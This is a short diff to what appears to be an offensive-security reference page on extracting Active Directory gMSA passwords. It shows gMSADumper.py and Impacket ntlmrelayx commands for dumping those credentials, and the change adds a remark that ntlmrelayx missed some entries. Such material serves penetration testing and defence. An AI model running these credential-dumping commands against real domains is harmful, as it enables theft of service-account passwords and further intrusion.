@@ -14,7 +14,7 @@ gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
 
 ****
 
-**Alternative #1**: Impacket's [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) tool can be used to read and decode gMSA passwords.
+**Alternative #1**: Impacket's [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) tool can be used to read and decode gMSA passwords. :warning: Some tests showed ntlmrelayx missed entries gMSADumper didn't.
 
 ```bash
 ntlmrelayx.py -t ldaps://10.0.0.5 -debug --dump-gmsa --no-dump --no-da --no-acl --no-validate-privs 
